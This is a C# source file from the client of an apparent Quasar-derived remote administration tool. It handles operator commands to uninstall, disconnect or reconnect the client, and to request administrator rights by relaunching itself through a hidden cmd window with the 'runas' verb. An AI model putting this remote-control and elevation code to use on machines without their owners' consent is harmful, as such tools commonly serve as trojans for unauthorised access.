

using System;
using System.Diagnostics;
using System.Windows.Forms;
using InvokedClient.Config;
using InvokedClient.Networking;
using InvokedClient.Setup;
using InvokedClient.User;
using InvokedClient.Utilities;
using InvokedCommon.Enums;
using InvokedCommon.Messages;
using InvokedCommon.Networking;


namespace InvokedClient.MessageHandlers
{
	public class ClientServicesHandler : IMessageProcessor
	{
		private readonly QuasarClient _client;
		private readonly InvokedClientApplication _application;

		public ClientServicesHandler(InvokedClientApplication application, QuasarClient client)
		{
			this._application = application;
			this._client = client;
		}

		public bool CanExecute(IMessage message)
		{
			switch (message)
			{
				case DoClientUninstall _:
				case DoClientDisconnect _:
				case DoClientReconnect _:
					return true;
				default:
					return message is DoAskElevate;
			}
		}

		public bool CanExecuteFrom(ISender sender) => true;

		public void Execute(ISender sender, IMessage message)
		{
			switch (message)
			{
				case DoClientUninstall message1:
					this.Execute(sender, message1);
					break;
				case DoClientDisconnect message2:
					this.Execute(sender, message2);
					break;
				case DoClientReconnect message3:
					this.Execute(sender, message3);
					break;
				case DoAskElevate message4:
					this.Execute(sender, message4);
					break;
			}
		}

		private void Execute(ISender client, DoClientUninstall message)
		{
			client.Send<SetStatus>(new SetStatus()
			{
				Message = "Uninstalling... good bye :-("
			});
			try
			{
				new ClientUninstaller().Uninstall();
				this._client.Exit();
			}
			catch (Exception ex)
			{
				client.Send<SetStatus>(new SetStatus()
				{
					Message = "Uninstall failed: " + ex.Message
				});
			}
		}

		private void Execute(ISender client, DoClientDisconnect message) => this._client.Exit();

		private void Execute(ISender client, DoClientReconnect message) => this._client.Disconnect();

		private void Execute(ISender client, DoAskElevate message)
		{
			if (new UserAccount().Type != AccountType.Admin)
			{
				ProcessStartInfo startInfo = new ProcessStartInfo()
				{
					FileName = "cmd",
					Verb = "runas",
					Arguments = "/k START \"\" \"" + Application.ExecutablePath + "\" & EXIT",
					WindowStyle = ProcessWindowStyle.Hidden,
					UseShellExecute = true
				};
				this._application.ApplicationMutex.Dispose();
				try
				{
					Process.Start(startInfo);
				}
				catch
				{
					client.Send<SetStatus>(new SetStatus()
					{
						Message = "User refused the elevation request."
					});
					this._application.ApplicationMutex = new SingleInstanceMutex(Settings.MUTEX);
					return;
				}
				this._client.Exit();
			}
			else
				client.Send<SetStatus>(new SetStatus()
				{
					Message = "Process already elevated."
				});
		}
	}
}